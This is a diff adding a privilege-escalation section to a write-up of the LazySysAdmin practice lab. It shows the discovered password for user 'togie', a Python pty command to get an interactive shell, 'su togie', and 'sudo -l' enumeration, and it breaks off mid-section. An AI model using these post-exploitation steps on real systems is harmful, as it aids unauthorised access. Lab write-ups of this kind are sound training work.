@@ -162,6 +162,66 @@ The transfer completed successfully, and the file was saved locally for further 
 
 ![Password Discovered in deets.txt](screenshots/password.png)
 
+### Privilege Escalation to Root
+
+At this point, we had discovered the credentials for the `togie` user:
+
+- **Username:** `togie`
+- **Password:** `12345`
+
+However, when we initially tried to switch to the `togie` user, we received the following error:
+
+```text
+su: must be run from a terminal
+```
+
+The problem was that our current shell was not attached to a proper interactive terminal.
+
+#### Getting an Interactive TTY
+
+Python came to the rescue. We used the `pty` module to spawn an interactive Bash shell:
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+After running the command, we obtained an interactive shell:
+
+```text
+<ww/html/wordpress/wp-content/themes/twentyfifteen$
+```
+
+We could now switch to the `togie` user:
+
+```bash
+su togie
+```
+
+The system asked for the password:
+
+```text
+Password: 12345
+```
+
+The login was successful:
+
+```text
+togie@LazySysAdmin:/var/www/html/wordpress/wp-content/themes/twentyfifteen$
+```
+
+### Checking Sudo Permissions
+
+After gaining access as `togie`, we checked which commands the user was allowed to execute with `sudo`:
+
+```bash
+sudo -l
+```
+
+We entered the password:
+
+```text
+[sudo] password for togie: 12345
+
 Upon examining the file, we discovered a password:
 
 - **Password:** `12345`
